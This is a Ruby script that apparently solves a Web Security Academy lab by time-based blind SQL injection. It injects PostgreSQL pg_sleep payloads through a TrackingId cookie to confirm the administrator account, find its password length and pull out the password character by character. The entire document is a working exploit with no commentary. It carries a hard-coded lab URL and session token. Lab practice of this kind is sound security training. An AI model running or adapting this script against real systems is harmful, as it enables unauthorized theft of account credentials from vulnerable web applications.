require 'http'

#Template for time based attacks
url = 'https://0afb002e03b693a98077d16c00bc0007.web-security-academy.net/'

cli1 = HTTP.cookies(
	:session=>"wFLorn1LiEFWFmoKddCsHSrCGq5k9ael",
	:TrackingId=>URI.encode_uri_component("x';SELECT CASE WHEN (username='administrator') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- -")
)

start_time = Time.now
resp = cli1.get url
puts "Delay Time: #{(Time.now-start_time).truncate}"

#Retrieve Password Length
length = 0
(1..25).each do |t|
	cli2 = HTTP.cookies(
	:session=>"wFLorn1LiEFWFmoKddCsHSrCGq5k9ael",
	:TrackingId=>URI.encode_uri_component("x';SELECT CASE WHEN (username='administrator' AND length(password)=#{t}) THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- -")
)
	start_time = Time.now
	resp = cli2.get url
	end_time = (Time.now-start_time).truncate
	if end_time>=5
		puts "Password Length is: #{t}"
		length = t
		break 
	end
end

#Retrieve Admin Password
chars = 'abcdefghijklmnopquvrstwxyz1234567890'
password = ''

print "Password is: "

20.times do |l|
	chars.length.times do |c|

		cli3 = HTTP.cookies(
		:session=>"wFLorn1LiEFWFmoKddCsHSrCGq5k9ael",
		:TrackingId=>URI.encode_uri_component("x';SELECT CASE WHEN (username='administrator' AND SUBSTRING(password,#{l+1},1)='#{chars[c]}') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users-- -")).headers("User-Agent"=>"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:137.0) Gecko/20100101 Firefox/137.0")
		start_time = Time.now
		resp = cli3.get url
		end_time = (Time.now-start_time).truncate
		sleep 2
		if end_time>=5
			print "#{chars[c]}"
		end
	end
end
